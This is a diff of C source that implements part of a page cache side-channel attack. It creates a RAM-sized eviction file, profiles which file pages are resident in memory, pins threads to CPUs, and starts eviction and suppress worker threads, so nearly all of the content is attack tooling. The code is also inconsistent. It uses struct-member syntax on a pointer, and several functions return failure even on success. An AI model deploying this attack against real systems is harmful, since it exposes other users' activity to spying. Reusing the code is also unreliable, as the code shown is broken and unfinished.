@@ -29,8 +29,15 @@
 #include "debug.h"
 
 
-static int running = 0;
+/*-----------------------------------------------------------------------------
+ * GLOBAL VARIABLES
+ */
 static size_t PAGE_SIZE = 0;
+static size_t TOTAL_RAM_BYTES = 0;
+static int MAX_PUS = 0;
+
+static int running = 0;
+static int used_pus = 0;
 
 
 /*-----------------------------------------------------------------------------
@@ -282,7 +289,7 @@ int initAttack(Attack *attack)
 }
 
 
-void exitAttack(Attack *attack)
+void freeAttack(Attack *attack)
 {
     // join all threads and kill all processes
     if (attack->event_child_ != 0)
@@ -306,9 +313,163 @@ void exitAttack(Attack *attack)
 /*-----------------------------------------------------------------------------
  * FUNCTIONS RELATED TO ATTACK
  */
-int pcaInit(Attack *attack)
-{
 
+// initialise attack, gets information which stays valid
+int pcaInit(Attack *attack) 
+{
+    int ret = 0;
+    struct sysinfo system_info;
+
+    // get system page size
+    PAGE_SIZE = sysconf(_SC_PAGESIZE);
+    if (PAGE_SIZE == -1)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at syscconf...\n", OSAL_EC));
+        goto error;
+    }
+
+    // get system information
+    ret = sysinfo(&system_info);
+    if (ret != 0)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at sysinfo...\n", OSAL_EC));
+        goto error;
+    }
+    TOTAL_RAM_BYTES = system_info.totalram;
+
+    // TODO windows would need different api does this even pay off??
+    // evaluate and throw out if proves unhelpful 
+    // get number of cpus
+    MAX_PUS = get_nprocs();
+    DEBUG_PRINT((DEBUG "%d PUs available...\n", MAX_PUS));
+
+    if(initAttack(attack) != 0) 
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at initAttack...\n", OSAL_EC));
+        goto error;
+    } 
+
+    return 0;
+error:
+    freeAttack(attack);
+    return -1;
+}
+
+// TODO replace "Error (%s)" with Error " OSAL_ERROR_CODE_FORMAT_STRING "
+int pcaStart(Attack *attack, int flags)
+{
+    int ret = 0;
+    cpu_set_t cpu_mask;
+    pthread_attr_t thread_attr;
+
+    // later used to set thread affinity
+    pthread_attr_init(&thread_attr);
+
+    // limit execution on CPU 0 by default
+    CPU_ZERO(&cpu_mask);
+    CPU_SET(0, &cpu_mask);
+    sched_setaffinity(0, sizeof(cpu_mask), &cpu_mask);
+    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
+
+
+    // profile system working set if wanted
+    if (attack->use_attack_ws_)
+    {
+        DEBUG_PRINT((DEBUG "Profiling working set...\n"));
+        if (profileAttackWorkingSet(attack) != 0)
+        {
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at profileAttackWorkingSet...\n", OSAL_EC));
+            goto error;
+        }
+
+        printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
+               attack.working_set_.resident_files_.count_, attack.working_set_.mem_in_ws_, attack.working_set_.ps_add_threshold_);
+    }
+
+
+    // create + map attack eviction set
+    DEBUG_PRINT((DEBUG "Trying to create a %zu MB random file.\nThis might take a while...\n", 
+        TOTAL_RAM_BYTES / 1024 / 1024));
+    ret = createEvictionSet(attack);
+    if (ret != 0)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at createEvictionSet...\n", OSAL_EC));
+        goto error;
+    }
+
+
+
+
+    printf(PENDING "Initialising...\n");
+
+
+// if wanted use eviction threads
+#ifdef ES_USE_THREADS
+    if (spawnESThreads(&attack.eviction_set_, attack.target_addr_, attack.mincore_check_all_x_bytes_) != 0)
+    {
+        printf(FAIL "Error at spawnESThreads...\n");
+        goto error;
+    }
+#endif
+
+    // next thread(s) by default on different core
+    CPU_ZERO(&cpu_mask);
+    CPU_SET(used_pus, &cpu_mask);
+    pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);
+    used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
+
+    // spawn surpressing set worker threads
+    if (spawnSuppressThreads(&attack, &thread_attr) != 0)
+    {
+        printf(FAIL "Error at spawnSSThreads...\n");
+        goto error;
+    }
+
+    // manager for working set
+    if (attack.use_attack_ws_ && pthread_create(&attack.ws_manager_thread_, &thread_attr, wsManagerThread, &attack.working_set_) != 0)
+    {
+        printf(FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC);
+    }
+
+    // manager for blocking set
+    if (attack.use_attack_bs_)
+    {
+        if (pthread_create(&attack.bs_manager_thread_, &thread_attr, bsManagerThread, &attack.blocking_set_) != 0)
+        {
+            printf(FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC);
+        }
+        else
+        {
+            // wait till blocking set is initialized
+            sem_wait(&attack.blocking_set_.initialized_sem_);
+        }
+    }
+
+
+
+    // profile working set
+    // start all threads and so on
+    // ...
+
+
+    // Windows -> what do we do about the attack working set???
+    // best would be to keep it in new processes 
+    // but how to share -> shared memory etc??
+
+
+    // windows needs a second init function as some stuff there can only happen with support 
+    // of the main application -> flags
+
+error:
+
+    return -1;
+}
+
+
+// teardown
+int pcaStop(Attack *attack)
+{
+    return 0;
 }
 
 
@@ -487,6 +648,31 @@ int pcaTargetFileSampleFlushRangeOnce(Attack *attack, TargetFile *target_file, s
 }
 
 
+int createEvictionSet(Attack *attack)
+{
+    int ret = 0;
+
+    // file eviction set
+    ret = createRandomFile(attack->eviction_set_.eviction_file_path_, TOTAL_RAM_BYTES);
+    if (ret != 0)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at createRandomFile...\n", OSAL_EC));
+        goto error;
+    }
+    if (mapFile(&attack->eviction_set_.mapping_, attack->eviction_set_.eviction_file_path_, 
+        FILE_ACCESS_READ | FILE_NOATIME, MAPPING_SHARED | MAPPING_ACCESS_READ) != 0)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapFile for: %s ...\n", OSAL_EC, 
+            attack->eviction_set_.eviction_file_path_));
+        goto error;
+    }
+    // anonymous eviction set
+
+error:
+    return -1;
+}
+
+
 int profileResidentPagesFile(Attack *attack, char *file_path) 
 {
     CachedFile current_cached_file;
@@ -505,7 +691,7 @@ int profileResidentPagesFile(Attack *attack, char *file_path)
     // open file, do not update access time (faster), skip in case of errors            
     if (mapFile(&current_cached_file.mapping_, file_path, FILE_ACCESS_READ | FILE_NOATIME, MAPPING_ACCESS_READ | MAPPING_SHARED) < 0)
     {
-        DEBUG_PRINT((DEBUG "Error (%s) at mapping of file: %s...\n", strerror(errno), file_path));
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at mapping of file: %s...\n", OSAL_EC, file_path));
         goto error;
     }
     // advise random access to avoid readahead (we dont want to change the working set)
@@ -514,7 +700,7 @@ int profileResidentPagesFile(Attack *attack, char *file_path)
     // get status of the file pages
     if (getCacheStatusFile(&current_cached_file.mapping_) != 0)
     {
-        DEBUG_PRINT((DEBUG "Error (%s) at getCacheStatusFile...\n", strerror(errno)));
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
         goto error;
     }
 
@@ -522,7 +708,7 @@ int profileResidentPagesFile(Attack *attack, char *file_path)
     target_file = hashMapGet(&attack->targets_, file_path, strlen(file_path));
     if (target_file != NULL) 
     {
-        targetFileTrimReadahead(target_file, &current_cached_file.mapping_, attack->ra_window_size_pages_);
+        targetFileCacheStatusMaskReadahead(target_file, &current_cached_file.mapping_, attack->ra_window_size_pages_);
     }
 
     // parse page sequences, skip in case of errors
@@ -566,7 +752,8 @@ error:
     return -1;
 }
 
-void targetFileTrimReadahead(TargetFile *target_file, FileMapping *target_file_mapping, size_t ra_window_size_pages) 
+
+void targetFileCacheStatusMaskReadahead(TargetFile *target_file, FileMapping *target_file_mapping, size_t ra_window_size_pages) 
 {
     size_t back_ra_trigger_window = ra_window_size_pages / 2 - 1;
     size_t front_ra_trigger_window = ra_window_size_pages / 2;
@@ -591,6 +778,7 @@ void targetFileTrimReadahead(TargetFile *target_file, FileMapping *target_file_m
             target_file_mapping->pages_cache_status_[p] = 0;
     }
 }
+
 
 int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
 {
@@ -660,6 +848,17 @@ error:
 }
 
 
+int pageSeqCmp(void *node, void *data)
+{
+    if (((PageSequence *)data)->length_ > ((PageSequence *)node)->length_)
+    {
+        return 1;
+    }
+
+    return 0;
+}
+
+
 #ifdef __linux
 int profileAttackWorkingSet(Attack *attack)
 {
@@ -671,7 +870,7 @@ int profileAttackWorkingSet(Attack *attack)
     fts_handle = fts_open(attack->working_set_.search_paths_, FTS_PHYSICAL, NULL);
     if (fts_handle == NULL)
     {
-        DEBUG_PRINT((DEBUG "Error (%s) at fts_open...\n", strerror(errno)));
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_open...\n", OSAL_EC));
         return -1;
     }
 
@@ -688,7 +887,7 @@ int profileAttackWorkingSet(Attack *attack)
                 break;
             }
 
-            DEBUG_PRINT((DEBUG "Error (%s) at fts_read...\n", strerror(errno)));
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_read...\n", OSAL_EC));
             goto error;
         }
         // end
@@ -776,12 +975,4 @@ error:
 }
 #endif
 
-int pageSeqCmp(void *node, void *data)
-{
-    if (((PageSequence *)data)->length_ > ((PageSequence *)node)->length_)
-    {
-        return 1;
-    }
 
-    return 0;
-}
